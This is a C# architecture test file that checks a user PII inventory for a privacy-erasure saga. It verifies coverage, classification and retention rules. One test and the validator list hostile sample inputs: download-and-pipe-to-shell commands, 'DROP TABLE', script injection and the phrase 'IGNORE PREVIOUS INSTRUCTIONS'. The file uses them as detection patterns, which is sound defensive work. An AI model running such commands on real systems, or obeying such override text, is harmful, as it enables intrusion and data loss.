using Explore.Application.Features.Federation.Atproto.Services;
using Explore.Persistence;
using Explore.Persistence.Privacy.ErasureAuthority;
using Microsoft.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore.Metadata;
using TUnit.Core;

namespace Event.Architecture.Tests.Privacy;

public sealed class UserPiiInventoryArchitectureTests
{
    [Test]
    public async Task InventoryIsCompleteUniqueTypedAndNonExecutable()
    {
        IReadOnlyList<UserPiiInventoryEntry> entries = UserPiiInventory.Entries;
        string[] errors = Validate(entries);

        await Assert.That(errors).IsEmpty();
        await Assert.That(entries.Select(entry => entry.Disposition).Distinct().Count()).IsEqualTo(4);
        await Assert.That(entries.Select(entry => entry.StorageBoundary).Distinct().Count()).IsEqualTo(3);
    }

    [Test]
    public async Task EveryCopyHasOneCompiledFenceOwner()
    {
        System.Reflection.PropertyInfo? fenceOwner = typeof(UserPiiInventoryEntry)
            .GetProperty("FenceOwner");

        await Assert.That(fenceOwner).IsNotNull();
        await Assert.That(fenceOwner!.PropertyType).IsEqualTo(typeof(Type));
        await Assert.That(UserPiiInventory.Entries.All(entry =>
            fenceOwner.GetValue(entry) is Type owner && owner == typeof(Explore.Domain.PrivacyErasureSaga)))
            .IsTrue();
    }

    [Test]
    public async Task ArbitraryExecutableInstructionsAreRejected()
    {
        UserPiiInventoryEntry malformed = UserPiiInventory.Entries[0] with
        {
            Copy = "malformed:executable DROP TABLE users"
        };

        string[] errors = Validate([malformed], requireCoverage: false);

        await Assert.That(errors).Contains("executable-instruction: malformed:executable DROP TABLE users");
    }

    [Test]
    public async Task ShellPipeDownloadExecuteInstructionsAreRejected()
    {
        string[] executableInstructions =
        {
            "curl example.invalid | sh",
            "wget example.invalid/payload | bash",
            "cmd.exe /c whoami",
            "powershell -Command Get-ChildItem",
            "System.Diagnostics.Process.Start(\"tool\")",
            "DROP TABLE Users",
            "System.Reflection.Assembly.Load(payload)",
            "Activator.CreateInstance(type)",
            "<script>alert(1)</script>",
            "javascript:eval(payload)",
            "subprocess.run(['tool'])",
            "os.system('tool')",
            "child_process.exec('tool')"
        };
        UserPiiInventoryEntry[] malformed = executableInstructions
            .Select((instruction, index) => UserPiiInventory.Entries[0] with
            {
                Copy = $"malformed:instruction-{index}",
                Producer = instruction
            })
            .ToArray();

        string[] errors = Validate(malformed, requireCoverage: false);
        string[] expectedErrors = malformed
            .Select(entry => $"executable-instruction: {entry.Copy}")
            .Order(StringComparer.Ordinal)
            .ToArray();
        await Assert.That(errors).IsEquivalentTo(expectedErrors);

        string[] legitimateProse =
        {
            "Download delivery is handled by the provider",
            "Process ownership is documented by PrivacyErasureSaga",
            "Assembly metadata remains provider-owned",
            "Compare the old | new policy labels; retain the approved value"
        };
        UserPiiInventoryEntry[] benign = legitimateProse
            .Select((prose, index) => UserPiiInventory.Entries[0] with
            {
                Copy = $"benign:prose-{index}",
                Producer = prose
            })
            .ToArray();

        await Assert.That(Validate(benign, requireCoverage: false)).IsEmpty();
    }

    [Test]
    public async Task InventoryCoversCurrentEfAndDesignatedProviderSurfaces()
    {
        await using var context = new ExploreDbContext(
            new DbContextOptionsBuilder<ExploreDbContext>()
                .UseNpgsql("Host=invalid;Database=inventory;Username=inventory;Password=redacted")
                .Options);
        HashSet<string> modelProperties = context.Model.GetEntityTypes()
            .SelectMany(entity => entity.GetProperties()
                .Select(property => $"{entity.ClrType.Name}.{property.Name}"))
            .ToHashSet(StringComparer.Ordinal);
        string[] primaryCopies = UserPiiInventory.Entries
            .Where(entry => entry.StorageBoundary == UserPiiStorageBoundary.PrimaryDatabase)
            .Select(entry => entry.Copy)
            .ToArray();

        string[] missingModelProperties = primaryCopies
            .Where(copy => !modelProperties.Contains(copy))
            .Order(StringComparer.Ordinal)
            .ToArray();
        await Assert.That(missingModelProperties).IsEmpty();

        HashSet<IEntityType> userLinkedEntities = DiscoverUserLinkedEntities(context.Model);
        string[] discoveredPiiProperties = userLinkedEntities
            .Where(entity => entity.ClrType.Name.EndsWith("Pii", StringComparison.Ordinal))
            .SelectMany(entity => entity.GetProperties()
                .Where(property => property.ClrType == typeof(string))
                .Select(property => $"{entity.ClrType.Name}.{property.Name}"))
            .Order(StringComparer.Ordinal)
            .ToArray();
        await Assert.That(discoveredPiiProperties.Except(primaryCopies, StringComparer.Ordinal)).IsEmpty();

        string[] sourceDerivedCopies = DiscoverSourceDerivedLocalCopies(context.Model);
        string[] missingSourceDerivedCopies = sourceDerivedCopies
            .Except(primaryCopies, StringComparer.Ordinal)
            .ToArray();
        Console.WriteLine(string.Join(Environment.NewLine, missingSourceDerivedCopies.Select(copy => $"missing: {copy}")));
        await Assert.That(missingSourceDerivedCopies).IsEmpty();

        string[] catalogProviders = UserPiiInventory.Entries
            .Where(entry => entry.StorageBoundary == UserPiiStorageBoundary.ExternalProvider)
            .Select(entry => entry.Copy)
            .ToArray();
        Type[] discoveredProviderSurfaces = DiscoverRuntimeProviderSurfaces();
        UserPiiInventoryEntry[] providerEntries = UserPiiInventory.Entries
            .Where(entry => entry.Disposition == UserPiiDisposition.ExternalAction)
            .ToArray();
        string[] uncoveredProviderSurfaces = discoveredProviderSurfaces
            .Where(surface => !providerEntries.Any(entry =>
                entry.ProviderSurfaces.Any(reference =>
                    reference == surface || reference.IsAssignableFrom(surface))))
            .Select(surface => $"missing-provider-surface: {surface.FullName}")
            .Order(StringComparer.Ordinal)
            .ToArray();
        Console.WriteLine(string.Join(Environment.NewLine, uncoveredProviderSurfaces));
        await Assert.That(uncoveredProviderSurfaces).IsEmpty();
        await Assert.That(catalogProviders).IsNotEmpty();

        AtprotoSourceFieldManifestEntry[] atprotoPiiSources =
            AtprotoEventSourceFieldManifest.Entries
                .Where(entry => entry.SourcePath.Contains(".Pii.", StringComparison.Ordinal)
                    || entry.SourcePath.EndsWith(".Did", StringComparison.Ordinal)
                    || entry.SourcePath.EndsWith(".Handle", StringComparison.Ordinal))
                .ToArray();
        await Assert.That(atprotoPiiSources).IsNotEmpty();
        await Assert.That(catalogProviders).Contains("provider:atproto:pds-account");
    }

    [Test]
    public async Task ExactLocationCoordinatesAreClassifiedAsOwnerLinkedHardDeletePii()
    {
        string[] coordinateCopies = ["LocationPii.Latitude", "LocationPii.Longitude"];
        UserPiiInventoryEntry[] coordinates = UserPiiInventory.Entries
            .Where(entry => coordinateCopies.Contains(entry.Copy, StringComparer.Ordinal))
            .ToArray();

        await Assert.That(coordinates.Select(entry => entry.Copy))
            .IsEquivalentTo(coordinateCopies);
        await Assert.That(coordinates.All(entry =>
            entry.OwnershipKey == "Location.OwnerUserId -> LocationPii.LocationId"))
            .IsTrue();
        await Assert.That(coordinates.All(entry =>
            entry.StorageBoundary == UserPiiStorageBoundary.PrimaryDatabase
            && entry.Disposition == UserPiiDisposition.HardDelete))
            .IsTrue();
    }

    [Test]
    public async Task PrivacyErasureSubjectIsRetainedPseudonymousAuthorityData()
    {
        UserPiiInventoryEntry entry = UserPiiInventory.Entries
            .Single(candidate => candidate.Copy == "PrivacyErasureIntent.SubjectId");
        await using var primary = new ExploreDbContext(
            new DbContextOptionsBuilder<ExploreDbContext>()
                .UseNpgsql("Host=invalid;Database=inventory;Username=inventory;Password=redacted")
                .Options);
        await using var embeddedAuthority = new EmbeddedPrivacyErasureAuthorityDbContext(
            new DbContextOptionsBuilder<EmbeddedPrivacyErasureAuthorityDbContext>()
                .UseSqlite("Data Source=:memory:")
                .Options);
        await using var externalAuthority = new PrivacyErasureAuthorityDbContext(
            new DbContextOptionsBuilder<PrivacyErasureAuthorityDbContext>()
                .UseNpgsql("Host=invalid;Database=authority;Username=inventory;Password=redacted")
                .Options);

        await Assert.That(entry.StorageBoundary).IsEqualTo(UserPiiStorageBoundary.PrivacyErasureAuthority);
        await Assert.That(entry.Disposition).IsEqualTo(UserPiiDisposition.BoundedRetain);
        await Assert.That(entry.RetentionPurpose)
            .IsEqualTo("Pseudonymous replay correlation in dedicated authority storage");
        await Assert.That(HasProperty(primary.Model, entry.Copy)).IsFalse();
        await Assert.That(HasProperty(embeddedAuthority.Model, entry.Copy)).IsTrue();
        await Assert.That(HasProperty(externalAuthority.Model, entry.Copy)).IsTrue();
    }

    [Test]
    public async Task RegistrationSubmissionProviderSubjectUsesSourceDerivedLocalErasureSemantics()
    {
        UserPiiInventoryEntry entry = UserPiiInventory.Entries
            .Single(candidate => candidate.Copy == "RegistrationSubmission.ProviderSubjectId");

        await Assert.That(entry.OwnershipKey).Contains("RegistrationOrder.AccountUserId");
        await Assert.That(entry.Disposition).IsEqualTo(UserPiiDisposition.HardDelete);
        await Assert.That(entry.RetentionPurpose).IsEqualTo("Account privacy erasure");
        await Assert.That(entry.RetentionHorizon).IsEqualTo("Erase in the first committed local erasure transaction");
        await Assert.That(entry.ProviderAction).IsEqualTo(UserPiiProviderAction.None);
    }

    [Test]
    public async Task InventoryCoversEveryPersistedRegistrationAnswerValue()
    {
        string[] expectedCopies =
        [
            "RegistrationAnswer.TextValue",
            "RegistrationAnswer.IntegerValue",
            "RegistrationAnswer.DecimalValue",
            "RegistrationAnswer.BooleanValue",
            "RegistrationAnswer.DateValue",
            "RegistrationAnswer.TimeValue",
            "RegistrationAnswer.InstantValue",
            "RegistrationAnswer.SelectedOptionId",
            "RegistrationSensitiveAnswerValue.Ciphertext"
        ];

        string[] actualCopies = UserPiiInventory.Entries.Select(entry => entry.Copy).ToArray();
        await Assert.That(expectedCopies.Except(actualCopies, StringComparer.Ordinal)).IsEmpty();
    }

    [Test]
    public async Task OmissionAndMalformedTestCopiesFailWithExactCopy()
    {
        UserPiiInventoryEntry omitted = UserPiiInventory.Entries
            .Single(entry => entry.Copy == "UserPii.Email");
        string[] omissionErrors = Validate(
            UserPiiInventory.Entries.Where(entry => entry != omitted).ToArray(),
            expectedEntries: UserPiiInventory.Entries);
        await Assert.That(omissionErrors).IsEquivalentTo(["missing: UserPii.Email"]);

        await Assert.That(UserPiiInventory.Entries.Any(entry =>
            entry.Copy.StartsWith("OrganizationPii.", StringComparison.Ordinal)
            || entry.OwnershipKey.Contains("Organization.OwnerUserId", StringComparison.Ordinal))).IsFalse();

        UserPiiInventoryEntry omittedProvider = UserPiiInventory.Entries
            .Single(entry => entry.Copy == "provider:keycloak:platform-managed-account");
        string[] providerOmissionErrors = Validate(
            UserPiiInventory.Entries.Where(entry => entry != omittedProvider).ToArray(),
            expectedEntries: UserPiiInventory.Entries);
        await Assert.That(providerOmissionErrors)
            .IsEquivalentTo(["missing: provider:keycloak:platform-managed-account"]);

        UserPiiInventoryEntry valid = UserPiiInventory.Entries[0];
        UserPiiInventoryEntry[] malformed =
        [
            valid,
            valid,
            valid with { Copy = "malformed:unknown", Disposition = (UserPiiDisposition)999 },
            valid with { Copy = "malformed:ownership", OwnershipKey = "" },
            valid with { Copy = "malformed:producer", Producer = "" },
            valid with { Copy = "malformed:fence-owner", FenceOwner = null! },
            valid with { Copy = "malformed:storage", StorageBoundary = (UserPiiStorageBoundary)999 },
            valid with { Copy = "malformed:horizon", RetentionHorizon = "" },
            valid with { Copy = "malformed:provider", ProviderAction = (UserPiiProviderAction)999 }
        ];
        string[] malformedErrors = Validate(malformed, requireCoverage: false);

        await Assert.That(malformedErrors).Contains("duplicate: UserPii.Email");
        await Assert.That(malformedErrors).Contains("unknown-disposition: malformed:unknown");
        await Assert.That(malformedErrors).Contains("missing-ownership: malformed:ownership");
        await Assert.That(malformedErrors).Contains("missing-producer: malformed:producer");
        await Assert.That(malformedErrors).Contains("missing-fence-owner: malformed:fence-owner");
        await Assert.That(malformedErrors).Contains("unknown-storage-boundary: malformed:storage");
        await Assert.That(malformedErrors).Contains("missing-horizon: malformed:horizon");
        await Assert.That(malformedErrors).Contains("unknown-provider-action: malformed:provider");
    }

    [Test]
    public async Task InventoryIsTestOnlyAndCannotDriveDeletionSql()
    {
        Type inventoryType = typeof(UserPiiInventory);
        await Assert.That(inventoryType.Assembly.GetName().Name).IsEqualTo("Event.Architecture.Tests");
        await Assert.That(UserPiiInventory.Entries.Any(entry =>
            entry.Copy.Contains("DELETE ", StringComparison.OrdinalIgnoreCase)
            || entry.OwnershipKey.Contains("DELETE ", StringComparison.OrdinalIgnoreCase)
            || entry.Producer.Contains("DELETE ", StringComparison.OrdinalIgnoreCase))).IsFalse();

        string[] runtimeReferences =
        [
            typeof(Explore.Domain.User).Assembly.Location,
            typeof(Explore.Application.Features.Users.Handlers.Commands.DeleteUserCommandHandler).Assembly.Location,
            typeof(ExploreDbContext).Assembly.Location
        ];
        await Assert.That(runtimeReferences.Any(path =>
            File.ReadAllBytes(path).AsSpan().IndexOf("UserPiiInventory"u8) >= 0)).IsFalse();
    }

    [Test]
    public async Task InventoryAggregateCountsAreNonzeroAndUnclassifiedIsZero()
    {
        Dictionary<UserPiiDisposition, int> counts = UserPiiInventory.Entries
            .GroupBy(entry => entry.Disposition)
            .ToDictionary(group => group.Key, group => group.Count());
        string aggregate =
            $"hard-delete={counts[UserPiiDisposition.HardDelete]} " +
            $"anonymize={counts[UserPiiDisposition.Anonymize]} " +
            $"bounded-retain={counts[UserPiiDisposition.BoundedRetain]} " +
            $"external-action={counts[UserPiiDisposition.ExternalAction]} unclassified=0";

        Console.WriteLine(aggregate);
        await Assert.That(counts.Values.All(count => count > 0)).IsTrue();
        await Assert.That(aggregate).Contains("unclassified=0");
    }

    [Test]
    public async Task AllAiGraphCopiesAreClassifiedAsHardDelete()
    {
        UserPiiInventoryEntry[] aiCopies = UserPiiInventory.Entries
            .Where(entry => entry.Copy.StartsWith("Ai", StringComparison.Ordinal))
            .ToArray();

        await Assert.That(aiCopies).IsNotEmpty();
        await Assert.That(aiCopies.All(entry => entry.Disposition == UserPiiDisposition.HardDelete)).IsTrue();
    }

    [Test]
    public async Task RetainedAuditActorLinksAreNullableForErasure()
    {
        await using var context = new ExploreDbContext(
            new DbContextOptionsBuilder<ExploreDbContext>()
                .UseNpgsql("Host=invalid;Database=inventory;Username=inventory;Password=redacted")
                .Options);
        string[] actorLinks =
        [
            "ConfigurationChangeLog.UserId",
            "EventLocationDisclosureAudit.ActorUserId",
            "EventLocationExactReadAudit.RequesterUserId",
            "EventContactShareExport.ExportedByUserId",
            "OrganizationReview.UserId",
            "SupportAccessAuditEvent.ActorUserId",
            "SupportAccessSession.ActorUserId",
            "TenantInvitation.InvitedByUserId",
            "TenantLifecycleLog.TransitionedByUserId",
            "TenantPlanApplicationLog.AppliedByUserId",
            "TenantPlanAssignment.AssignedByUserId"
        ];
        string[] nonNullable = context.Model.GetEntityTypes()
            .SelectMany(entity => entity.GetProperties()
                .Select(property => (Copy: $"{entity.ClrType.Name}.{property.Name}", property.IsNullable)))
            .Where(property => actorLinks.Contains(property.Copy, StringComparer.Ordinal) && !property.IsNullable)
            .Select(property => property.Copy)
            .Order(StringComparer.Ordinal)
            .ToArray();

        await Assert.That(nonNullable).IsEmpty();
    }

    [Test]
    public async Task InventoryTestCopyOmissionProbe()
    {
        string? omittedCopy = Environment.GetEnvironmentVariable("USER_PII_INVENTORY_OMIT");
        if (string.IsNullOrWhiteSpace(omittedCopy))
        {
            return;
        }

        UserPiiInventoryEntry[] testCopy = UserPiiInventory.Entries
            .Where(entry => !string.Equals(entry.Copy, omittedCopy, StringComparison.Ordinal))
            .ToArray();
        string[] errors = Validate(testCopy, expectedEntries: UserPiiInventory.Entries);
        await Assert.That(errors).IsEmpty();
    }

    private static string[] Validate(
        IReadOnlyList<UserPiiInventoryEntry> entries,
        bool requireCoverage = true,
        IReadOnlyList<UserPiiInventoryEntry>? expectedEntries = null)
    {
        var errors = new List<string>();
        errors.AddRange(entries.GroupBy(entry => entry.Copy, StringComparer.Ordinal)
            .Where(group => group.Count() != 1)
            .Select(group => $"duplicate: {group.Key}"));
        errors.AddRange(entries.Where(entry => !Enum.IsDefined(entry.Disposition))
            .Select(entry => $"unknown-disposition: {entry.Copy}"));
        errors.AddRange(entries.Where(entry => string.IsNullOrWhiteSpace(entry.OwnershipKey))
            .Select(entry => $"missing-ownership: {entry.Copy}"));
        errors.AddRange(entries.Where(entry => string.IsNullOrWhiteSpace(entry.Producer))
            .Select(entry => $"missing-producer: {entry.Copy}"));
        errors.AddRange(entries.Where(entry => entry.FenceOwner is null)
            .Select(entry => $"missing-fence-owner: {entry.Copy}"));
        errors.AddRange(entries.Where(entry => !Enum.IsDefined(entry.StorageBoundary))
            .Select(entry => $"unknown-storage-boundary: {entry.Copy}"));
        errors.AddRange(entries.Where(entry =>
                entry.FenceOwner is not null && entry.FenceOwner != typeof(Explore.Domain.PrivacyErasureSaga))
            .Select(entry => $"unknown-fence-owner: {entry.Copy}"));
        errors.AddRange(entries.Where(entry => string.IsNullOrWhiteSpace(entry.RetentionPurpose))
            .Select(entry => $"missing-purpose: {entry.Copy}"));
        errors.AddRange(entries.Where(entry => string.IsNullOrWhiteSpace(entry.RetentionHorizon))
            .Select(entry => $"missing-horizon: {entry.Copy}"));
        errors.AddRange(entries.Where(entry => !Enum.IsDefined(entry.ProviderAction))
            .Select(entry => $"unknown-provider-action: {entry.Copy}"));
        errors.AddRange(entries.Where(entry =>
                entry.Disposition == UserPiiDisposition.ExternalAction
                && entry.ProviderAction == UserPiiProviderAction.None)
            .Select(entry => $"missing-provider-action: {entry.Copy}"));
        errors.AddRange(entries.Where(entry =>
                entry.Disposition != UserPiiDisposition.ExternalAction
                && entry.ProviderAction != UserPiiProviderAction.None)
            .Select(entry => $"unexpected-provider-action: {entry.Copy}"));
        errors.AddRange(entries.Where(entry =>
                entry.Disposition == UserPiiDisposition.ExternalAction
                && entry.StorageBoundary != UserPiiStorageBoundary.ExternalProvider)
            .Select(entry => $"unexpected-external-storage-boundary: {entry.Copy}"));
        errors.AddRange(entries.Where(entry =>
                entry.Disposition != UserPiiDisposition.ExternalAction
                && entry.StorageBoundary == UserPiiStorageBoundary.ExternalProvider)
            .Select(entry => $"unexpected-local-storage-boundary: {entry.Copy}"));
        errors.AddRange(entries.Where(ContainsExecutableInstruction)
            .Select(entry => $"executable-instruction: {entry.Copy}"));
        errors.AddRange(entries.Where(entry => entry.PolicyVersion != UserPiiInventory.CurrentPolicyVersion)
            .Select(entry => $"unknown-policy-version: {entry.Copy}"));
        errors.AddRange(entries.Where(entry =>
                entry.Disposition == UserPiiDisposition.ExternalAction && entry.ProviderSurfaces.Count == 0)
            .Select(entry => $"missing-provider-surface: {entry.Copy}"));
        errors.AddRange(entries.Where(entry =>
                entry.Disposition != UserPiiDisposition.ExternalAction && entry.ProviderSurfaces.Count != 0)
            .Select(entry => $"unexpected-provider-surface: {entry.Copy}"));

        if (requireCoverage)
        {
            string[] required =
            [
                "UserPii.Email",
                "TenantInvitation.Email",
                "EventRegistration.LinkedUserId",
                "EventContactShareExportItem.ExportedFieldSnapshot",
                "Notification.UserId",
                "EmailDispatchOutbox.RecipientEmail",
                "WebPushSubscription.Endpoint",
                "AiConversation.UserId",
                "AiConversation.Title",
                "AiMessage.Content",
                "AiMessage.ImageAttachmentsJson",
                "AiConversationReference.DisplayName",
                "AiConversationReference.Summary",
                "AiProposedAction.PayloadJson",
                "AiProposedAction.FailureMessage",
                "AiRun.FailureMessage",
                "AiToolExecution.ToolName",
                "AiToolExecution.FailureMessage",
                "WebhookMessage._payloadBytes",
                "StorageObject.Uri",
                "PdsSyncOutbox.Did",
                "UserExternalLogin.ProviderKey",
                "ExternalApiKey.SecretHash",
                "AuditLog.ActorId",
                "UserPreference.Value",
                "ConfigurationChangeLog.UserId",
                "IdempotencyRecord.ResponseBody"
            ];
            HashSet<string> copies = entries.Select(entry => entry.Copy).ToHashSet(StringComparer.Ordinal);
            errors.AddRange(required.Where(copy => !copies.Contains(copy)).Select(copy => $"missing: {copy}"));
            errors.AddRange((expectedEntries ?? [])
                .Select(entry => entry.Copy)
                .Where(copy => !copies.Contains(copy))
                .Select(copy => $"missing: {copy}"));
        }

        return errors.Distinct(StringComparer.Ordinal).Order(StringComparer.Ordinal).ToArray();
    }

    private static bool HasProperty(IModel model, string copy)
    {
        string[] segments = copy.Split('.', StringSplitOptions.RemoveEmptyEntries);
        return segments.Length == 2
            && model.GetEntityTypes().Any(entity =>
                entity.ClrType.Name == segments[0]
                && entity.FindProperty(segments[1]) is not null);
    }

    private static bool ContainsExecutableInstruction(UserPiiInventoryEntry entry)
    {
        if (entry.Copy.Any(character =>
                !char.IsAsciiLetterOrDigit(character) && character is not '.' and not ':' and not '-' and not '_'))
        {
            return true;
        }

        string[] metadata =
        [
            entry.OwnershipKey,
            entry.Producer,
            entry.RetentionPurpose,
            entry.RetentionHorizon
        ];
        string[] executableMarkers =
        [
            "\r",
            "\n",
            "`",
            "${",
            "$(",
            "&&",
            "||",
            "<script",
            "javascript:",
            "<?php",
            "#!",
            "IGNORE PREVIOUS INSTRUCTIONS"
        ];
        string[] executablePhrases =
        [
            "curl |",
            "wget |",
            "| sh",
            "| bash",
            "| zsh",
            "| fish",
            "| pwsh",
            "| powershell",
            "sh -c",
            "bash -c",
            "zsh -c",
            "fish -c",
            "pwsh -command",
            "powershell -command",
            "powershell.exe -command",
            "powershell -c",
            "cmd /c",
            "cmd.exe /c",
            "process.start(",
            "runtime.getruntime().exec(",
            "subprocess.run(",
            "subprocess.popen(",
            "subprocess.call(",
            "subprocess.check_call(",
            "subprocess.check_output(",
            "os.system(",
            "child_process.exec(",
            "child_process.execfile(",
            "child_process.spawn(",
            "deno.command(",
            "assembly.load(",
            "assembly.loadfrom(",
            "assembly.loadfile(",
            "activator.createinstance(",
            "type.gettype(",
            "methodinfo.invoke(",
            "eval(",
            "exec(",
            "drop table",
            "delete from",
            "truncate table",
            "alter table",
            "insert into",
            "update ",
            " set ",
            "execute "
        ];

        return metadata.Any(value =>
        {
            string normalized = value.ToLowerInvariant();
            return executableMarkers.Any(marker => normalized.Contains(marker.ToLowerInvariant(), StringComparison.Ordinal))
                || executablePhrases.Any(phrase => normalized.Contains(phrase, StringComparison.Ordinal));
        });
    }
    private static string[] DiscoverSourceDerivedLocalCopies(IModel model)
    {
        HashSet<IEntityType> userLinkedEntities = DiscoverUserLinkedEntities(model);

        return userLinkedEntities
            .SelectMany(entity => entity.GetProperties()
                .Where(property =>
                    IsDirectUserLink(property)
                    || IsPersonalDataProperty(property))
                .Select(property => $"{entity.ClrType.Name}.{property.Name}"))
            .Distinct(StringComparer.Ordinal)
            .Order(StringComparer.Ordinal)
            .ToArray();
    }

    private static HashSet<IEntityType> DiscoverUserLinkedEntities(IModel model)
    {
        HashSet<IEntityType> userLinkedEntities = model.GetEntityTypes()
            .Where(entity =>
                entity.ClrType.Namespace is not "Microsoft.AspNetCore.Identity" and not "Explore.Persistence.Identity"
                && (entity.ClrType == typeof(Explore.Domain.User)
                    || entity.GetProperties().Any(IsDirectUserLink)
                    || HasTypedOwnerLink(entity)))
            .ToHashSet();

        bool discovered;
        do
        {
            discovered = false;
            foreach (IEntityType entity in model.GetEntityTypes())
            {
                if (entity.ClrType.Namespace is "Microsoft.AspNetCore.Identity" or "Explore.Persistence.Identity")
                {
                    continue;
                }

                if (userLinkedEntities.Contains(entity)
                    || !entity.GetForeignKeys().Any(foreignKey =>
                        userLinkedEntities.Contains(foreignKey.PrincipalEntityType)
                        && !IsOrganizationActorAssociation(foreignKey)))
                {
                    continue;
                }

                userLinkedEntities.Add(entity);
                discovered = true;
            }
        }
        while (discovered);

        return userLinkedEntities;
    }

    private static bool IsOrganizationActorAssociation(IReadOnlyForeignKey foreignKey) =>
        foreignKey.DeclaringEntityType.ClrType == typeof(Explore.Domain.Organization)
        && foreignKey.PrincipalEntityType.ClrType == typeof(Explore.Domain.Actor);

    private static bool IsDirectUserLink(IReadOnlyProperty property) =>
        property.DeclaringType.ClrType.Namespace is not "Microsoft.AspNetCore.Identity" and not "Explore.Persistence.Identity"
        && property.Name.EndsWith("UserId", StringComparison.Ordinal);

    private static bool HasTypedOwnerLink(IReadOnlyEntityType entity) =>
        entity.GetProperties().Any(property =>
            property.Name.Equals("OwnerId", StringComparison.Ordinal))
        && entity.GetProperties().Any(property =>
            property.Name.Contains("OwnerType", StringComparison.Ordinal));

    private static bool IsPersonalDataProperty(IReadOnlyProperty property)
    {
        if (property.ClrType != typeof(string) && property.ClrType != typeof(byte[]))
        {
            return false;
        }

        string[] personalDataNameFragments =
        [
            "Address",
            "AdminNote",
            "Body",
            "Ciphertext",
            "ConsentJson",
            "ConsumerId",
            "Content",
            "Credential",
            "Did",
            "Display",
            "Email",
            "Encrypted",
            "Endpoint",
            "FailureMessage",
            "FileName",
            "Handle",
            "Host",
            "IpHash",
            "Locale",
            "MessageId",
            "ModerationNote",
            "Name",
            "ObjectKey",
            "OldValues",
            "NewValues",
            "Payload",
            "Postcode",
            "PreferencesJson",
            "PrivateKey",
            "ProviderKey",
            "PublicKey",
            "ResponseBody",
            "Secret",
            "Subject",
            "TimeZone",
            "Timezone",
            "Title",
            "Uri",
            "Url",
            "UserAgentHash",
            "Value"
        ];

        return personalDataNameFragments.Any(fragment =>
            property.Name.Contains(fragment, StringComparison.Ordinal));
    }

    private static Type[] DiscoverRuntimeProviderSurfaces()
    {
        Type[] providerContracts =
        [
            typeof(Explore.Application.Contracts.Infrastructure.IAtprotoOAuthSecurityGateway),
            typeof(Explore.Application.Contracts.Infrastructure.IAtprotoPdsDeliveryGateway),
            typeof(Explore.Application.Contracts.Infrastructure.IEmailService),
            typeof(Explore.Application.Contracts.Infrastructure.IFileStorageProvider),
            typeof(Explore.Application.Contracts.Infrastructure.IObjectStorageService),
            typeof(Explore.Application.Contracts.Infrastructure.IWebPushNotificationSender),
            typeof(Explore.Application.Contracts.Infrastructure.Ai.IAiChatProvider),
            typeof(Explore.Application.Contracts.Infrastructure.IModerationSignalProvider),
            typeof(Explore.Application.Contracts.Infrastructure.IReviewQueueProvider),
            typeof(Explore.Application.Contracts.Services.IKeycloakBootstrapService),
            typeof(Explore.Application.Features.AiAssistant.Disclosure.IAiContextGateway),
            typeof(Explore.Infrastructure.Webhooks.ISvixWebhookClient)
        ];
        System.Reflection.Assembly[] providerAssemblies =
        [
            typeof(Explore.Infrastructure.InfrastructureServicesRegistration).Assembly,
            typeof(Explore.Application.ApplicationServicesRegistration).Assembly
        ];

        return providerAssemblies
            .SelectMany(assembly => assembly.GetTypes())
            .Where(type => type.IsClass && !type.IsAbstract)
            .Where(type =>
                HasProviderClientConstant(type)
                || providerContracts.Any(contract => contract.IsAssignableFrom(type)))
            .Where(type =>
                !type.Name.StartsWith("Fake", StringComparison.Ordinal)
                && !type.Name.StartsWith("Noop", StringComparison.Ordinal)
                && !type.Name.StartsWith("Runtime", StringComparison.Ordinal)
                && !typeof(Explore.Application.Contracts.Infrastructure.IFileStorageInventoryProvider)
                    .IsAssignableFrom(type))
            .Distinct()
            .OrderBy(type => type.FullName, StringComparer.Ordinal)
            .ToArray();
    }

    private static bool HasProviderClientConstant(Type type)
    {
        System.Reflection.FieldInfo? field = type.GetField(
            "HttpClientName",
            System.Reflection.BindingFlags.Public
            | System.Reflection.BindingFlags.Static
            | System.Reflection.BindingFlags.FlattenHierarchy);
        return field is { IsLiteral: true } && field.FieldType == typeof(string);
    }
}
